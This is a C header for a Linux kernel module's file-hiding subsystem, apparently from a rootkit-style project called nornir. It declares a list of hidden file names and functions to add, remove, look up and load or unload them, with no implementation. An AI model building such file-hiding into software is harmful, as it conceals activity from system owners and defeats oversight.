/**
 * Copyright (c) 2024 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
 */

#ifndef NORNIR_FS_HIDE_H
#define NORNIR_FS_HIDE_H

#include <linux/list.h>

struct hidden_file {
    struct list_head list;
    char *filename;
};

extern struct list_head hidden_file_list;

extern void nornir_add_new_hidden_file(const char *name);
extern void nornir_remove_hidden_file(const char *name);
extern struct hidden_file*
nornir_get_hidden_file_info(const char *name, int namelen);

extern int nornir_init_file_hidden_subsystem(void);
extern void nornir_unload_file_hidden_subsystem(void);

#endif // NORNIR_FS_HIDE_H
